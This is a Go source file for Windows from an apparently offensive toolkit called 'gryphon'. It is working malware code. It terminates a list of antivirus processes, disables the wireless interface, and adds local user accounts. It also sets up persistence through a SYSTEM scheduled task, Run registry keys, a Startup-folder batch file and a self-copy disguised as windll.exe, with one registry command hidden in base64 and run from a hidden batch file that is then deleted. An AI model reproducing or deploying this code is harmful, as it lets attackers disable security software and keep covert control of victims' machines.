//go:build windows
// +build windows

package gryphon

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"

	ps "github.com/mitchellh/go-ps"
	"github.com/whiterabb17/gryphon/variables"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func killProcByPID(pid int) error {
	kernel32dll := windows.NewLazyDLL("Kernel32.dll")
	OpenProcess := kernel32dll.NewProc("OpenProcess")
	TerminateProcess := kernel32dll.NewProc("TerminateProcess")
	op, _, _ := OpenProcess.Call(0x0001, 1, uintptr(pid))
	//protip:too much error handling can screw things up
	_, _, err2 := TerminateProcess.Call(op, 9)
	return err2
}

func isRoot() bool {
	root := true

	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		root = false
	}

	return root
}

func info() string {
	user, err := cmdOut("query user")
	if err != nil {
		user = "N/A"
	}

	// o, err := cmdOut("ipconfig")
	// if err != nil {
	// 	ap_ip = "N/A" // (1)
	// }

	// entries := strings.Split(o, "\n")

	// for e := range entries {
	// 	entry := entries[e]
	// 	if strings.Contains(entry, "Default") {
	// 		ap_ip = strings.Split(entry, ":")[1] // (1)
	// 	}
	// }

	return user
}

func pkillAv() error {
	av_processes := []string{
		"advchk.exe", "ahnsd.exe", "alertsvc.exe", "alunotify.exe", "autodown.exe", "avmaisrv.exe",
		"avpcc.exe", "avpm.exe", "avsched32.exe", "avwupsrv.exe", "bdmcon.exe", "bdnagent.exe", "bdoesrv.exe",
		"bdss.exe", "bdswitch.exe", "bitdefender_p2p_startup.exe", "cavrid.exe", "cavtray.exe", "cmgrdian.exe",
		"doscan.exe", "dvpapi.exe", "frameworkservice.exe", "frameworkservic.exe", "freshclam.exe", "icepack.exe",
		"isafe.exe", "mgavrtcl.exe", "mghtml.exe", "mgui.exe", "navapsvc.exe", "nod32krn.exe", "nod32kui.exe",
		"npfmntor.exe", "nsmdtr.exe", "ntrtscan.exe", "ofcdog.exe", "patch.exe", "pav.exe", "pcscan.exe",
		"poproxy.exe", "prevsrv.exe", "realmon.exe", "savscan.exe", "sbserv.exe", "scan32.exe", "spider.exe",
		"tmproxy.exe", "trayicos.exe", "updaterui.exe", "updtnv28.exe", "vet32.exe", "vetmsg.exe", "vptray.exe",
		"vsserv.exe", "webproxy.exe", "webscanx.exe", "xcommsvr.exe"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if variables.ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func wifiDisconnect() error {
	cmd := `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

// Start Persistence Functions
func schtaskPersistence() error {
	cmd, er := GetPath()
	if er != nil {
		log.Println(er)
	}
	s, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "Winters.Solstice" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
	log.Println(s)
	log.Println(err)
	return err
}

func regPersistence() error {
	//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
	var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

	PERSIST, err := os.Create("PERSIST.bat")

	PERSIST.WriteString("mkdir %APPDATA%\\Windows" + "\n")
	PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
	PERSIST.WriteString(string(DecodedRegAdd))

	PERSIST.Close()

	Exec := exec.Command("cmd", "/C", "PERSIST.bat")
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Exec.Run()
	Clean := exec.Command("cmd", "/C", "del PERSIST.bat")
	Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Clean.Run()
	return err
}

func startUpPersistence() error {
	path := os.Args[0] //, er := GetName()

	err := WriteRegistryKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, "solstice", path)
	if err != nil {
		log.Println(err)
	}
	return err
}

func addPersistentCommand(persistenceType string) error {
	log.Println(persistenceType)
	var err error
	if persistenceType == "schtasks" || persistenceType == "Schtasks" {
		err = schtaskPersistence()
		if err != nil {
			log.Println(err)
		}
		err = schTaskPersist("WinLogin", os.Args[0])
	} else if persistenceType == "startup" || persistenceType == "Startup" {
		err = startUpPersistence()
		if err != nil {
			log.Println(err)
		}
		err = startupPersist("WinLogon", os.Args[0])
	} else if persistenceType == "reg" || persistenceType == "Reg" {
		err = regPersistence()
		if err != nil {
			log.Println(err)
		}
		err = registryPersist("WinLogin", os.Args[0])
	}
	bkPersist()
	return err
}

func bkPersist() {
	var StatupInfo syscall.StartupInfo
	var ProcessInfo syscall.ProcessInformation
	Args := syscall.StringToUTF16Ptr("c:\\windows\\system32\\cmd.exe /c mkdir %APPDATA%\\Windows")

	syscall.CreateProcess(
		nil,
		Args,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		&StatupInfo,
		&ProcessInfo)

	CopyString := string("c:\\windows\\system32\\cmd.exe /c copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe")

	Args = syscall.StringToUTF16Ptr(CopyString)

	syscall.CreateProcess(
		nil,
		Args,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		&StatupInfo,
		&ProcessInfo)

	Args = syscall.StringToUTF16Ptr("c:\\windows\\system32\\cmd.exe /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V WinDll /t REG_SZ /F /D %APPDATA%\\Windows\\windll.exe")

	syscall.CreateProcess(
		nil,
		Args,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		&StatupInfo,
		&ProcessInfo)
}
func registryPersist(name string, path string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	err2 := k.SetStringValue(name, path)
	if err2 != nil {
		return err2
	}
	defer k.Close()
	return nil
}

func startupPersist(name string, execPath string) error {
	path := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + name + ".bat"
	file, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		if os.IsNotExist(err) {
			file, err = os.Create(path)
			if err != nil {
				return err
			}
		} else {
			return err
		}
	}
	_, err2 := file.Write([]byte("start " + execPath))
	if err2 != nil {
		return err2
	}
	defer file.Close()
	return nil
}

func schTaskPersist(name string, path string) error {
	_, err := cmdOut(fmt.Sprintf("schtasks /create /st 00:00 /tn %q /tr %s", name, path))
	return err
}

// End Persistence Functions

func createUser(username, password string) error {
	cmd := f("net user %s %s /ADD", username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			found_drives = append(found_drives, string(drive)+":\\")
			f.Close()
		}
	}
	return found_drives, nil
}
